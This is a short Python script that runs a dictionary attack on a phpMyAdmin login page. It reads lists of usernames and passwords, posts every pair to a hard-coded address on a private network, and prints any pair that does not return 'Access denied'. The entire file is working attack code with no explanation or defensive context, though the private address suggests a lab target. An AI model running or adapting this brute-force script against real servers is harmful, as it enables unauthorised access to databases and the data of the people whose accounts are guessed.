import requests

with open("usernames.txt") as username_file, open("pass.txt") as password_file:
  username_list = [line.strip() for line in username_file.readlines()]
  password_list = [line.strip() for line in password_file.readlines()]

for user in username_list:
  for pwd in password_list:
    post_data = ({'pma_username': user, 'pma_password': pwd, 'server': 1})
    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
    
    url = "http://192.168.50.101/phpMyAdmin/index.php"

    response = requests.post(url, data = post_data, headers = headers)

    if "Access denied" not in response.text:
      print("Logged in with: ", user, "-", pwd)
    else:
      print("Failed:", user, "-", pwd)

username_file.close()
password_file.close()